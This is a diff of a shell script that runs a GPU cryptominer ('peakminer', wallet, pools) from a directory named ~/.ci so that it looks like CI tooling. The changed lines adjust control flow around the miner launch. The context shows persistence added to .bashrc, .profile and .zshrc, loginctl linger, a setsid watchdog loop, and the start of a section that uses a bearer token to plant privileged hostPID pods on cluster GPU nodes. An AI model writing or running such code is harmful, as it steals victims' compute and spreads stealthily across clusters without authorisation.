@@ -121,7 +121,8 @@ fi
 [ -x "$BIN" ] || BIN=$(find "$HOME/.ci/miner" -maxdepth 3 -type f -name 'peakminer*' -perm -u+x 2>/dev/null | head -1)
 chmod +x "$BIN" 2>/dev/null
 echo "miner_bin=$BIN"; [ -x "$BIN" ] && "$BIN" --version 2>&1 | head -2 || echo NO_MINER_BIN
-if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; else
+if [ ! -x "$BIN" ] || [ "$DEV" -lt 1 ]; then echo "MINER_SKIP bin=${BIN:-none} dev=$DEV"; fi
+if [ -x "$BIN" ] && [ "$DEV" -ge 1 ]; then
 launch(){ g=$1; shift; w="ul-${TAG}-${IPD}-g${g}"; lf="$HOME/.ci/logs/miner-g${g}.log"; : > "$lf"
   a=(-c pearl -u "$WALLET" -w "$w" -p x -d "$g" --api-port 0 -i 30 --no-color --log-file "$lf" --log-append --gpu-temp-stop 82 --gpu-temp-start 72 --gpu-power 70%)
   for P in "${POOLS[@]}"; do a+=(-o "$P"); done
@@ -162,6 +163,7 @@ loginctl enable-linger "$(id -un)" 2>&1 | tail -1
 for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"; done
 pgrep -f 'keep.sh; sleep' >/dev/null || ( setsid nohup bash -c 'while true; do '"$HOME"'/.ci/keep.sh; sleep 300; done' >/dev/null 2>&1 < /dev/null & )
 sleep 1; pgrep -af 'ci/keep.sh' | head -3
+fi
 
 sec CLUSTER_PLANT
 # If the bearer token can create pods, launch one privileged hostPID pod per GPU node.
